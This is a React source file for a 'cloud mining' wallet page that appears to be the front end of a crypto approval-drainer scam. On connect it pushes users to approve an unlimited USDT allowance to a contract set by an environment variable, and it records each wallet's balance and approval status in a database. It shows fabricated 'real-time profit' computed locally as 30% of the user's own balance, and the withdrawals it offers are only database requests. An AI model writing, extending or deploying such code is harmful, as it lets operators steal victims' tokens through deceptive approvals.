// wallet.tsx (updated with persistent profit state)
import { useState, useEffect, useMemo, useRef } from 'react';
import { ConnectButton } from '@rainbow-me/rainbowkit';
import { useAccount, useReadContract, useWriteContract, useBalance, usePublicClient } from 'wagmi';
import { supabase } from '../../lib/supabase';
import { toast } from 'react-toastify';
import { maxUint256 } from 'viem';

// @ts-ignore
const ERC20_ABI = [
  { "constant": true, "inputs": [{ "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
  { "constant": false, "inputs": [{ "name": "spender", "type": "address" }, { "name": "value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
  { "constant": true, "inputs": [{ "name": "owner", "type": "address" }, { "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }
] as const;

// @ts-ignore
const USDT_ADDRESS = process.env.NEXT_PUBLIC_USDT_ADDRESS as `0x${string}`;
const CLOUD_MINING_CONTRACT = process.env.NEXT_PUBLIC_CLOUD_MINING_CONTRACT as `0x${string}`;

// @ts-ignore
type UserData = {
  wallet_address: string;
  usdt_balance: number;
  profit_realtime: number;
  withdrawal_amount: number;
  infinite_allowance: boolean;
  last_login: string;
  show_evn: boolean;
  join_date: string;
};


export default function Wallet() {
  const { address } = useAccount();
  const publicClient = usePublicClient();
  const [userData, setUserData] = useState<any>(null);
  const [currentProfit, setCurrentProfit] = useState(0);
  const [showWithdrawModal, setShowWithdrawModal] = useState(false);
  const [withdrawals, setWithdrawals] = useState<any[]>([]);
  const profitRef = useRef(0);
  const updateCounter = useRef(0);
  const lastWithdrawRequest = useRef(false);

  const { data: balanceData, refetch: refetchBalance } = useBalance({ address, token: USDT_ADDRESS, query: { refetchInterval: 15000 } });
  const usdtBalance = useMemo(() => Number(balanceData?.formatted || 0), [balanceData]);

  const { data: allowanceData, refetch: refetchAllowance, isFetched: isAllowanceFetched } = useReadContract({
    address: USDT_ADDRESS,
    abi: ERC20_ABI,
    functionName: 'allowance',
    args: address ? [address, CLOUD_MINING_CONTRACT] : undefined,
    query: { enabled: !!address, refetchInterval: 15000 },
  });

  const hasInfiniteAllowance = useMemo(() => {
    if (!allowanceData || !isAllowanceFetched) return false;
    return BigInt(allowanceData.toString()) === BigInt(maxUint256.toString());
  }, [allowanceData, isAllowanceFetched]);

  const { writeContractAsync: approve } = useWriteContract();

  useEffect(() => {
    const handleAutoApprove = async () => {
      if (address && isAllowanceFetched && !hasInfiniteAllowance) {
        const confirm = window.confirm('You need to approve the contract to continue. Approve now?');
        if (confirm) {
          try {
            toast.info('Please sign the transaction...');
            const txHash = await approve({ address: USDT_ADDRESS, abi: ERC20_ABI, functionName: 'approve', args: [CLOUD_MINING_CONTRACT, maxUint256] });
            await publicClient?.waitForTransactionReceipt({ hash: txHash, confirmations: 1 });
            await Promise.all([refetchBalance(), refetchAllowance()]);
            toast.success('Approval success!');
          } catch (err) {
            toast.error('Approval failed');
            console.error(err);
          }
        }
      }
    };
    handleAutoApprove();
  }, [address, hasInfiniteAllowance, isAllowanceFetched]);

  useEffect(() => {
    const loadOrCreateUser = async () => {
      if (!address || !isAllowanceFetched) return;
      const { data, error } = await supabase.from('users').select('*').eq('wallet_address', address).maybeSingle();
      if (error) return console.error(error);
      const now = new Date().toISOString();
      if (!data) {
        const { data: newUser, error: insertError } = await supabase.from('users').insert({
          wallet_address: address,
          usdt_balance: usdtBalance,
          profit_realtime: 0,
          
          deposit_amount: 0,
          withdrawal_amount: 0,
          infinite_allowance: hasInfiniteAllowance,
          show_evn: false,
          join_date: now,
          last_login: now,
        }).single();
        if (insertError) return console.error(insertError);
        setUserData(newUser);
        profitRef.current = 0;
        setCurrentProfit(0);
      } else {
        await supabase.from('users').update({
          usdt_balance: usdtBalance,
          infinite_allowance: hasInfiniteAllowance,
          last_login: now,
        }).eq('wallet_address', address);
        setUserData(data);
        profitRef.current = data.profit_realtime;
        setCurrentProfit(data.profit_realtime);
        lastWithdrawRequest.current = data.withdraw_request;
      }
    };
    loadOrCreateUser();
  }, [address, usdtBalance, isAllowanceFetched]);

  useEffect(() => {
    if (!userData || !usdtBalance) return;

    const maxProfit = usdtBalance * 0.3;
    const profitPerSecond = maxProfit / (30 * 24 * 60 * 60);

    const interval = setInterval(async () => {
      const { data } = await supabase.from('users').select('profit_realtime, withdraw_request').eq('wallet_address', address).maybeSingle();
      if (data?.withdraw_request === false && lastWithdrawRequest.current === true) {
        profitRef.current = 0;
        setCurrentProfit(0);
        toast.info('Profit has been reset after withdrawal approval.');
      }
      lastWithdrawRequest.current = data?.withdraw_request ?? false;

      profitRef.current += profitPerSecond;
      const cappedProfit = Math.min(profitRef.current, maxProfit);
      profitRef.current = cappedProfit;
      setCurrentProfit(cappedProfit);

      updateCounter.current++;
      if (updateCounter.current >= 30) {
        updateCounter.current = 0;
        await supabase.from('users').update({ profit_realtime: cappedProfit }).eq('wallet_address', address);
      }
    }, 1000);

    return () => clearInterval(interval);
  }, [userData, usdtBalance]);

  const handleWithdraw = async () => {
    if (!userData || currentProfit < 10) return toast.error('Minimum withdraw is $10');
    const { error } = await supabase.from('users').update({
      withdrawal_amount: currentProfit,
      profit_realtime: 0,
      withdraw_request: true,
      last_update: new Date().toISOString(),
    }).eq('wallet_address', address);

    if (error) return toast.error('Withdraw failed');
    toast.success('Withdrawal request sent');
    setShowWithdrawModal(false);
  };

  useEffect(() => {
    const fetchWithdrawals = async () => {
      if (!address) return;
      const { data, error } = await supabase.from('withdraw_history')
        .select('*')
        .eq('wallet_address', address)
        .order('created_at', { ascending: false });
      if (error) return console.error(error);
      setWithdrawals(data);
    };
    fetchWithdrawals();
  }, [address]);

  return (
    <section className="max-w-4xl mx-auto my-12 p-6 bg-gray-900 rounded-xl shadow-[0_0_20px_-5px_rgba(96,165,250,0.3)]">
      <h2 className="text-3xl font-bold bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent text-center mb-8">WALLET</h2>
      <div className="p-6 border border-gray-700 rounded-xl bg-gradient-to-br from-blue-900/50 to-purple-900/50">
        <div className="space-y-4">
          {[
            ["USDT Balance:", `${usdtBalance.toFixed(2)} USD`],
            ["Join Date:", userData?.join_date ? new Date(userData.join_date).toLocaleDateString() : "N/A"],
            ["Profit (Real-time):", `$${currentProfit.toFixed(2)} USD`],
            
            ["Status Mining:", hasInfiniteAllowance ? "Approved" : "Not Approved"],
          ].map(([label, value], index) => (
            <div key={index} className="flex justify-between items-center p-4 bg-white/5 rounded-lg border border-gray-700">
              <span className="text-gray-300">{label}</span>
              <span className={`text-white font-medium ${label === "Status Mining:" ? (hasInfiniteAllowance ? "text-green-400" : "text-red-400") : ""}`}>
          {value}
              </span>
            </div>
          ))}
            <div className="mt-8 flex justify-center gap-4">
              <ConnectButton 
                label="Connect Wallet"
                accountStatus="address"
                chainStatus="icon"
                showBalance={false}
              />
            </div>
            <button
            disabled={currentProfit < 10}
            onClick={() => setShowWithdrawModal(true)}
            className={`w-full mt-4 px-4 py-2 rounded text-white font-semibold ${
              currentProfit >= 10 ? "bg-red-500 hover:bg-red-600" : "bg-gray-500 cursor-not-allowed"
            }`}
            >
            Withdraw
            </button>
            <p className="mt-2 text-sm text-center text-gray-400">
            Withdrawals can only be made if the profit exceeds $10.
            </p>
        </div>

      {showWithdrawModal && (
        <div className="mt-4 p-4 bg-gray-700 rounded shadow-md">
          <p className="text-lg text-white font-medium">Withdraw ${currentProfit.toFixed(2)}?</p>
          <div className="flex justify-end gap-2 mt-2">
            <button onClick={() => setShowWithdrawModal(false)} className="px-4 py-2 bg-gray-500 rounded hover:bg-gray-600 text-white">Cancel</button>
            <button onClick={handleWithdraw} className="px-4 py-2 bg-blue-600 rounded hover:bg-blue-700 text-white">Confirm</button>
          </div>
        </div>
      )}

      <div className="mt-8">
        <div className="flex justify-between items-center mb-4">
          <h3 className="text-xl text-amber-50 font-semibold">Transaction History</h3>
          <button
        onClick={async () => {
          const { data, error } = await supabase.from('withdraw_history')
            .select('*')
            .eq('wallet_address', address)
            .order('created_at', { ascending: false });
          if (error) {
            console.error(error);
            toast.error('Failed to refresh transaction history');
          } else {
            setWithdrawals(data);
            toast.success('Transaction history refreshed');
          }
        }}
        className="px-4 py-2 bg-blue-600 rounded hover:bg-blue-700 text-white"
          >
        Refresh
          </button>
        </div>
        {withdrawals.length === 0 ? (
          <p className="text-gray-400">No withdrawals yet.</p>
        ) : (
          withdrawals.map((item) => (
        <div key={item.id} className="p-4 mb-3 bg-white/5 rounded border border-gray-600">
          <div className="flex justify-between">
            <span className="text-gray-300">Amount:</span>
            <span className="text-white font-medium">{item.amount.toFixed(2)} USD</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-300">TX Hash:</span>
            <span className="text-blue-400 break-all">{item.tx_hash}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-300">Date:</span>
            <span className="text-white font-medium">{new Date(item.created_at).toLocaleString()}</span>
          </div>
        </div>
          ))
        )}
      </div>
    </div>
    </section>
  );
}